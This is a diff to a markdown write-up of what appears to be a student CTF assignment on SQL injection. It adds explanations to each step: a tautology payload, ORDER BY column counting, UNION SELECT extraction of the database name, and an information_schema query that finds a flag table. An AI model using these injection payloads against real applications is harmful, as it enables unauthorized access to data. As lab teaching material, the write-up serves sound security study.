@@ -110,23 +110,24 @@ Find the SQL Injection point
 bello' or '1'='1 
 ```
 ![image](https://github.com/user-attachments/assets/2ac94953-e134-442e-9fca-c7f255916af6)
+Result: All user data is displayed → confirms that the input is directly injected into the SQL query.
 
 
-
-The number of columns is 4
+we use the ORDER BY clause with increasing numbers to find how many columns the original query returns.
 ```
 bello' order by [num] #
 ```
 ![image](https://github.com/user-attachments/assets/68c8e490-72c7-41a5-a08e-807ece73ef22)
+No error up to ORDER BY 4, but ORDER BY 5 triggers an error.
+Conclusion: The query has 4 columns.
 
 
-
-Name of Databse: sqli_1
+We use the UNION SELECT technique to retrieve the name of the current database.
 ```
 bello' union select database(), 2 ,3 ,4 #
 ```
 ![image](https://github.com/user-attachments/assets/07c57dd6-43f3-4e5f-bcf1-78c98badbcc9)
-
+Name of Databse: sqli_1
 
 
 Find the tables in Database
@@ -134,6 +135,7 @@ Find the tables in Database
 ' union select table_name, 2, 3 ,4 from information_schema.tables where table_schema = 'sqli_1' #
 ```
 ![image](https://github.com/user-attachments/assets/bff2111c-d1cf-49d2-9863-ef79d7211b3a)
+Result: Found a table named flag_table.
 
 
 
@@ -151,7 +153,7 @@ Find the **FLAG**
 ![스크린샷 2025-05-29 172917](https://github.com/user-attachments/assets/785e3dc8-bf25-40da-9916-c4ba81273669)
 
 
-
+# Assignment 6 - 3 / CTF SQL Injection 2
 
 
 
